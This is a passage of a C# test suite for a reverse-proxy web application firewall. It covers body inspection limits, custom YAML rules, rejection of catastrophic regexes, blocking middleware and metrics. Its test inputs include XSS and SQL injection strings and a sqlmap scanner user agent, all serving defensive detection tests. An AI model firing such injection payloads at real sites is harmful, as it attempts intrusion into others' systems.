    [TestMethod]
    public void Body_NeverInspectsBinaryUploadsOrFileParts()
    {
        const string payload = "<script>alert(1)</script> ' OR '1'='1";
        Assert.AreEqual(0, Run("/up", BlockOptions(), Browser(), payload, "application/octet-stream").Matches.Count);
        Assert.AreEqual(0, Run("/up", BlockOptions(), Browser(), payload, "image/png").Matches.Count);
        Assert.AreEqual(0, Run("/up", BlockOptions(), Browser(), payload, "text/plain").Matches.Count);
        Assert.AreEqual(0, Run("/up", BlockOptions(), Browser(), payload, null).Matches.Count);

        const string boundary = "B0";
        var multipart = string.Join(
            "\r\n",
            "--" + boundary,
            "Content-Disposition: form-data; name=\"f\"; filename=\"a.html\"",
            "Content-Type: text/html",
            "",
            "<script>alert(1)</script>",
            "--" + boundary,
            "Content-Disposition: form-data; name=\"blob\"",
            "Content-Type: application/octet-stream",
            "",
            "<script>alert(1)</script>",
            "--" + boundary + "--",
            "");
        var verdict = Run("/up", BlockOptions(), Browser(), multipart, $"multipart/form-data; boundary={boundary}");
        Assert.AreEqual(0, verdict.Matches.Count, string.Join(", ", verdict.Matches.Select(m => m.RuleId)));
    }

    [TestMethod]
    public void Body_Malformed_JsonStillScreenedAsText_WithoutThrowing()
    {
        var verdict = Run("/api", BlockOptions(), Browser(), """{"q":"<script>alert(1)</script>""", "application/json");
        AssertCategory(verdict, "xss", "truncated json");
        var garbage = Run("/api", BlockOptions(), Browser(), "\0\0\u0001{{{[[[", "application/json");
        Assert.IsNotNull(garbage.Matches);
    }

    [TestMethod]
    public void BodyPolicy_Boundaries()
    {
        const int limit = 8192;
        const string json = "application/json";
        Assert.AreEqual(WafBodyOutcome.None, WafBodyPolicy.Decide(false, 0, json, null, limit));
        Assert.AreEqual(WafBodyOutcome.None, WafBodyPolicy.Decide(true, 0, json, null, limit));
        Assert.AreEqual(WafBodyOutcome.Inspected, WafBodyPolicy.Decide(true, 1, json, null, limit));
        Assert.AreEqual(WafBodyOutcome.Inspected, WafBodyPolicy.Decide(true, limit - 1, json, null, limit));
        Assert.AreEqual(WafBodyOutcome.Inspected, WafBodyPolicy.Decide(true, limit, json, null, limit), "exactly the limit");
        Assert.AreEqual(WafBodyOutcome.TooLarge, WafBodyPolicy.Decide(true, limit + 1, json, null, limit), "one byte over");
        Assert.AreEqual(WafBodyOutcome.UnknownLength, WafBodyPolicy.Decide(true, -1, json, null, limit), "chunked");
        Assert.AreEqual(WafBodyOutcome.Encoded, WafBodyPolicy.Decide(true, 100, json, "gzip", limit));
        Assert.AreEqual(WafBodyOutcome.Inspected, WafBodyPolicy.Decide(true, 100, json, "identity", limit));
        Assert.AreEqual(WafBodyOutcome.Disabled, WafBodyPolicy.Decide(true, 100, json, null, 0));
        Assert.AreEqual(WafBodyOutcome.NotEligible, WafBodyPolicy.Decide(true, 100, "application/octet-stream", null, limit));
        Assert.AreEqual(WafBodyOutcome.NotEligible, WafBodyPolicy.Decide(true, 100, null, null, limit));
        Assert.AreEqual(WafBodyOutcome.Inspected, WafBodyPolicy.Decide(true, 100, "application/x-www-form-urlencoded", null, limit));
        Assert.AreEqual(WafBodyOutcome.Inspected, WafBodyPolicy.Decide(true, 100, "multipart/form-data; boundary=x", null, limit));
        Assert.AreEqual(WafBodyOutcome.Inspected, WafBodyPolicy.Decide(true, 100, "APPLICATION/JSON; charset=utf-8", null, limit));
    }

    // ---------------------------------------------------------------- custom rules

    private const string CustomYaml = """
        rules:
          - id: ACME-001
            description: Internal token in a query value
            category: acme
            severity: critical
            targets: [query]
            regex: 'secret-token-[0-9]+'
            transformations: [urlDecode, lowercase]
            action: score
            score: 7
          - id: ACME-002
            category: acme
            severity: notice
            targets: [header:X-Debug]
            contains: ["enable-debug"]
            action: log
          - id: ACME-003
            category: acme
            severity: error
            targets: [path, body]
            contains: ["/internal-only"]
            action: block
        """;

    [TestMethod]
    public void CustomRules_Yaml_RegexContainsTransformationsAndActions()
    {
        var rules = WafCustomRules.Parse(CustomYaml);
        Assert.AreEqual(3, rules.Count);
        var engine = new WafEngine(new WafOptions { Mode = WafMode.Block, BlockThreshold = 100 }, rules);

        var scored = Run("/s?t=SECRET%2DTOKEN-42", engine: engine);
        var match = scored.Matches.Single(m => m.RuleId == "ACME-001");
        Assert.AreEqual(7, match.Score, "rule score overrides the severity weight");
        Assert.IsTrue(rules[0].IsCustom);
        CollectionAssert.AreEqual(new[] { WafTransform.UrlDecode, WafTransform.Lowercase }, rules[0].Transforms.ToArray());

        var logged = Run("/", engine: engine, headers: [("Host", "x"), ("X-Debug", "please enable-debug now")]);
        var log = logged.Matches.Single(m => m.RuleId == "ACME-002");
        Assert.AreEqual(0, log.Score, "log action adds nothing");
        Assert.AreEqual(0, logged.Score);
        var otherHeader = Run("/", engine: engine, headers: [("Host", "x"), ("X-Other", "enable-debug")]);
        Assert.AreEqual(0, otherHeader.Matches.Count(m => m.RuleId == "ACME-002"), "header:Name reads only that header");

        var forced = Run("/api/internal-only/x", engine: engine);
        Assert.IsTrue(forced.Matches.Any(m => m.RuleId == "ACME-003"));
        Assert.IsTrue(forced.Blocked, "block action refuses whatever the total");
        Assert.IsFalse(Run("/api/ok", engine: engine).Blocked);
    }

    [TestMethod]
    public void CustomRules_AreRejected_WhenUnsafeOrInvalid()
    {
        static WafRuleException Fails(string yaml) => Assert.ThrowsExactly<WafRuleException>(() => WafCustomRules.Parse(yaml));

        StringAssert.Contains(Fails("rules:\n  - id: A\n    targets: [query]\n    regex: '(a+)+$'\n").Message, "A");
        StringAssert.Contains(Fails("rules:\n  - id: A\n    targets: [query]\n    regex: '('\n").Message, "A");
        StringAssert.Contains(Fails("rules:\n  - id: A\n    targets: [nowhere]\n    contains: [x]\n").Message, "nowhere");
        StringAssert.Contains(Fails("rules:\n  - id: A\n    targets: [query]\n    contains: [x]\n    action: explode\n").Message, "explode");
        StringAssert.Contains(Fails("rules:\n  - id: A\n    targets: [query]\n    contains: [x]\n    transformations: [rot13]\n").Message, "rot13");
        StringAssert.Contains(Fails("rules:\n  - id: A\n    targets: [query]\n    contains: [x]\n    severity: fatal\n").Message, "severity");
        StringAssert.Contains(Fails("rules:\n  - targets: [query]\n    contains: [x]\n").Message, "id");
        StringAssert.Contains(Fails("rules:\n  - id: A\n    targets: [query]\n").Message, "A");
        StringAssert.Contains(Fails("rules:\n  - id: TW-XSS-001\n    targets: [query]\n    contains: [x]\n").Message, "TW-XSS-001");
        StringAssert.Contains(Fails("rules:\n  - id: A\n    targets: [query]\n    contains: [x]\n  - id: a\n    targets: [query]\n    contains: [y]\n").Message, "twice");
        StringAssert.Contains(Fails("rules: [unclosed").Message, "YAML");
        Assert.AreEqual(0, WafCustomRules.Parse("").Count);
        Assert.AreEqual(0, WafCustomRules.Parse("rules: []").Count);
    }

    [TestMethod]
    public void CustomRules_Pattern_MustNotRunUnboundedBacktracking()
    {
        var rules = WafCustomRules.Parse("rules:\n  - id: ACME-9\n    targets: [query]\n    regex: 'a{1,20}b'\n");
        var timeouts = 0;
        var sw = Stopwatch.StartNew();
        _ = rules[0].Matches(new string('a', 1024 * 1024), ref timeouts);
        Assert.IsTrue(sw.ElapsedMilliseconds < 2000, $"{sw.ElapsedMilliseconds} ms");
    }

    [TestMethod]
    public void Engine_Create_LoadsRulesFile_AndFailsWhenMissingOrInvalid()
    {
        var path = Path.Combine(Path.GetTempPath(), "twp-waf-rules-" + Guid.NewGuid().ToString("N") + ".yaml");
        try
        {
            File.WriteAllText(path, CustomYaml);
            var engine = WafEngine.Create(new WafOptions { Mode = WafMode.Block, RulesFile = path });
            Assert.AreEqual(WafRulePack.Rules.Count + 3, engine.Rules.Count);
            Assert.IsTrue(Run("/s?t=secret-token-1", engine: engine).Matches.Any(m => m.RuleId == "ACME-001"));

            File.WriteAllText(path, "rules:\n  - id: Z\n    targets: [query]\n    regex: '(a+)+$'\n");
            Assert.ThrowsExactly<WafRuleException>(() => WafEngine.Create(new WafOptions { RulesFile = path }));

            // The earlier deny-list file format stays readable: it has no signature rules.
            File.WriteAllText(path, """{"denyPaths":["^/from-file"]}""");
            Assert.AreEqual(WafRulePack.Rules.Count, WafEngine.Create(new WafOptions { RulesFile = path }).Rules.Count);
        }
        finally
        {
            File.Delete(path);
        }

        Assert.ThrowsExactly<WafRuleException>(
            () => WafEngine.Create(new WafOptions { RulesFile = Path.Combine(Path.GetTempPath(), "missing-" + Guid.NewGuid().ToString("N") + ".yaml") }));
    }

    // ---------------------------------------------------------------- middleware, stats, wiring

    private static ProxyMiddlewareContext ViewContext(string path, string method = "GET", string? userAgent = null) => new()
    {
        Session = new object(),
        Request = new MiddlewareRequestView
        {
            Method = method,
            Path = path,
            Host = "example",
            GetHeaderValues = userAgent is null
                ? null
                : name => string.Equals(name, "User-Agent", StringComparison.OrdinalIgnoreCase) ? [userAgent] : null,
        },
    };

    [TestMethod]
    public async Task Middleware_Detect_LetsTheRequestThrough_AndCounts()
    {
        var mw = new WafScreeningMiddleware(new WafOptions { Mode = WafMode.Detect });
        var ctx = ViewContext("/s?q=<script>alert(1)</script>");
        var passed = false;
        await mw.InvokeAsync(ctx, (_, _) => { passed = true; return ValueTask.CompletedTask; }, CancellationToken.None);

        Assert.IsTrue(passed);
        Assert.IsFalse(ctx.IsHandled);
        Assert.AreEqual(1, mw.Stats.Requests(WafMode.Detect));
        Assert.AreEqual(1, mw.Stats.WouldBlock);
        Assert.AreEqual(0, mw.Stats.Blocked);
        Assert.AreEqual(1, mw.Stats.Detections("xss"));
    }

    [TestMethod]
    public async Task Middleware_Block_Answers403_AndDoesNotCallNext()
    {
        var mw = new WafScreeningMiddleware(new WafOptions { Mode = WafMode.Block });
        var ctx = ViewContext("/s?q=1+union+select+1", userAgent: "Mozilla/5.0");
        var passed = false;
        await mw.InvokeAsync(ctx, (_, _) => { passed = true; return ValueTask.CompletedTask; }, CancellationToken.None);

        Assert.IsFalse(passed);
        Assert.IsTrue(ctx.IsHandled);
        Assert.AreEqual(403, ctx.HandledStatusCode);
        Assert.AreEqual("forbidden", ctx.HandledBody);
        Assert.AreEqual(1, mw.Stats.Blocked);
        Assert.AreEqual(1, mw.Stats.Requests(WafMode.Block));

        var clean = ViewContext("/index.html", userAgent: "Mozilla/5.0");
        passed = false;
        await mw.InvokeAsync(clean, (_, _) => { passed = true; return ValueTask.CompletedTask; }, CancellationToken.None);
        Assert.IsTrue(passed);
        Assert.IsFalse(clean.IsHandled);
    }

    [TestMethod]
    public async Task Middleware_Off_DoesNothing()
    {
        var mw = new WafScreeningMiddleware(new WafOptions { Mode = WafMode.Off });
        var ctx = ViewContext("/s?q=<script>");
        var passed = false;
        await mw.InvokeAsync(ctx, (_, _) => { passed = true; return ValueTask.CompletedTask; }, CancellationToken.None);
        Assert.IsTrue(passed);
        Assert.AreEqual(0, mw.Stats.Requests(WafMode.Detect) + mw.Stats.Requests(WafMode.Block));
    }

    [TestMethod]
    public async Task Middleware_ScannerAgentOnViewIsBlocked()
    {
        var mw = new WafScreeningMiddleware(new WafOptions { Mode = WafMode.Block });
        var ctx = ViewContext("/", userAgent: "sqlmap/1.7");
        await mw.InvokeAsync(ctx, (_, _) => ValueTask.CompletedTask, CancellationToken.None);
        Assert.AreEqual(403, ctx.HandledStatusCode);
        Assert.AreEqual(1, mw.Stats.Detections("scanner"));
    }

    [TestMethod]
    public async Task Middleware_LogsRuleIds_NotQueryValues()
    {
        var logger = new CapturingLogger();
        var mw = new WafScreeningMiddleware(new WafOptions { Mode = WafMode.Detect }, logger: logger);
        await mw.InvokeAsync(ViewContext("/s?token=SECRETVALUE&q=<script>"), (_, _) => ValueTask.CompletedTask, CancellationToken.None);
        var line = logger.Lines.Single();
        StringAssert.Contains(line, "TW-XSS-001");
        StringAssert.Contains(line, "/s");
        Assert.IsFalse(line.Contains("SECRETVALUE", StringComparison.Ordinal), line);
    }

    [TestMethod]
    public void Stats_AppendToPrometheus()
    {
        var mw = new WafScreeningMiddleware(new WafOptions { Mode = WafMode.Detect });
        var sb = new StringBuilder();
        mw.Stats.AppendTo(sb, 46);
        var text = sb.ToString();
        StringAssert.Contains(text, "titanium_waf_info{pack=\"waf-pack-1\"} 46");
        StringAssert.Contains(text, "titanium_waf_requests_total{mode=\"detect\"} 0");
        StringAssert.Contains(text, "titanium_waf_would_block_total 0");
        StringAssert.Contains(text, "titanium_waf_blocked_total 0");
        StringAssert.Contains(text, "titanium_waf_bodies_total{outcome=\"toolarge\"} 0");
        StringAssert.Contains(text, "titanium_waf_rule_timeouts_total 0");
    }

    [TestMethod]
    public void Guard_Start_RegistersScreeningInDetectMode_AndMetrics()
    {
        var middleware = new List<IProxyMiddleware>();
        var appenders = new List<Action<StringBuilder>>();
        var context = new PlusActivationContext
        {
            ProxyServer = new object(),
            Middleware = middleware,
            RegisterMetricsAppender = appenders.Add,
        };

        var guard = WafGuard.TryStart(context, new Dictionary<string, string> { ["waf.enabled"] = "true" });

        Assert.IsNotNull(guard);
        Assert.IsNotNull(guard.Screening);
        Assert.AreEqual(1, middleware.OfType<WafScreeningMiddleware>().Count());
        Assert.AreEqual(1, middleware.OfType<WafDenyMiddleware>().Count());
        Assert.AreEqual(1, appenders.Count);
        var sb = new StringBuilder();
        appenders[0](sb);
        StringAssert.Contains(sb.ToString(), "titanium_waf_info{pack=\"waf-pack-1\"}");
        Assert.AreEqual(WafMode.Detect, guard.Screening.Engine.DefaultProfile.Mode);
    }

    [TestMethod]
    public void Guard_Start_ModeOff_NeedsAWafPolicyToRegisterScreening()
    {
        var off = new Dictionary<string, string> { ["waf.enabled"] = "true", ["waf.mode"] = "off" };

        var plain = new List<IProxyMiddleware>();
        var guardOff = WafGuard.TryStart(new PlusActivationContext { ProxyServer = new object(), Middleware = plain }, off);
        Assert.IsNotNull(guardOff);
        Assert.IsNull(guardOff.Screening);
        Assert.AreEqual(0, plain.OfType<WafScreeningMiddleware>().Count());

        var withPolicy = new List<IProxyMiddleware>();
        var guardPolicy = WafGuard.TryStart(
            new PlusActivationContext
            {
                ProxyServer = new object(),
                Middleware = withPolicy,
                Policies = [new RoutePolicyConfig { Name = "strict", Kind = "waf", Mode = "block" }],
            },
            off);
        Assert.IsNotNull(guardPolicy?.Screening);
        Assert.IsTrue(guardPolicy.Screening.HasRoutePolicies);
        Assert.AreEqual(1, withPolicy.OfType<WafScreeningMiddleware>().Count());
        Assert.IsNull(WafGuard.TryStart(new PlusActivationContext { ProxyServer = new object(), Middleware = [] }, new Dictionary<string, string>()));
    }

    [TestMethod]
    public void Guard_Start_FailsLoudly_OnBadOptions()
    {
        var context = new PlusActivationContext { ProxyServer = new object(), Middleware = new List<IProxyMiddleware>() };
        Assert.ThrowsExactly<InvalidOperationException>(() =>
            WafGuard.TryStart(context, new Dictionary<string, string> { ["waf.enabled"] = "true", ["waf.mode"] = "audit" }));
        Assert.ThrowsExactly<WafRuleException>(() =>
            WafGuard.TryStart(
                context,
                new Dictionary<string, string>
                {
                    ["waf.enabled"] = "true",
                    ["waf.rulesFile"] = Path.Combine(Path.GetTempPath(), "gone-" + Guid.NewGuid().ToString("N")),
                }));
    }

    // ---------------------------------------------------------------- terminate-lite

    [TestMethod]
    public void TerminateLite_IsNotEligible_WhenTheWafIsEnabled()
    {
        using var proxy = new ProxyServer(false, false, false);
        var endpoint = new TransparentProxyEndPoint(IPAddress.Loopback, 0, false)
        {
            ForwardHost = "127.0.0.1",
            ForwardPort = 80,
        };
        var request = new Request { Method = "GET", HttpVersion = HttpHeader.Version11 };
        request.RequestUriString8 = "/".GetByteString();

        Assert.IsTrue(proxy.CanUseH1TerminateLite(endpoint, request, false, false, false, null), "baseline is lite");

        proxy.ReverseProxy = new ReverseProxyOptions { Middleware = [new WafDenyMiddleware(WafRules.FromOptions(new Dictionary<string, string>()))] };
        Assert.IsTrue(proxy.CanUseH1TerminateLite(endpoint, request, false, false, false, null), "the deny-list still runs on lite");

        proxy.ReverseProxy = new ReverseProxyOptions { Middleware = [new WafScreeningMiddleware(new WafOptions { Mode = WafMode.Detect })] };
        Assert.IsFalse(proxy.CanUseH1TerminateLite(endpoint, request, false, false, false, null), "screening needs the session");
        Assert.IsTrue(new WafScreeningMiddleware(new WafOptions()) is IRequiresSessionPathMiddleware);
    }

    // ---------------------------------------------------------------- hot path

    [TestMethod]
    public void HotPath_CleanSmallRequest_DoesNotAllocate()
    {
        var engine = new WafEngine(BlockOptions());
        var profile = engine.DefaultProfile;
        var headers = new HeaderCollection();
        foreach (var (name, value) in Browser())
        {
            headers.AddHeader(name, value);
        }

        var request = new WafRequest { Target = "/search?q=hello+world&page=2&sort=price", Headers = headers };

        for (var i = 0; i < 2000; i++)
        {
            _ = engine.Inspect(request, profile);
        }

        var before = GC.GetAllocatedBytesForCurrentThread();
        const int iterations = 5000;
        for (var i = 0; i < iterations; i++)
        {
            var verdict = engine.Inspect(request, profile);
            Assert.AreEqual(0, verdict.Score);
        }

        var perRequest = (GC.GetAllocatedBytesForCurrentThread() - before) / (double)iterations;
        Assert.IsTrue(perRequest < 16, $"allocated {perRequest:F1} bytes per clean request");
    }

    private sealed class CapturingLogger : Microsoft.Extensions.Logging.ILogger
    {
        public List<string> Lines { get; } = [];

        public IDisposable? BeginScope<TState>(TState state)
            where TState : notnull => null;

        public bool IsEnabled(Microsoft.Extensions.Logging.LogLevel logLevel) => true;

        public void Log<TState>(
            Microsoft.Extensions.Logging.LogLevel logLevel,
            Microsoft.Extensions.Logging.EventId eventId,
            TState state,
            Exception? exception,
            Func<TState, Exception?, string> formatter)
        {
            Lines.Add(formatter(state, exception));
        }
    }
}
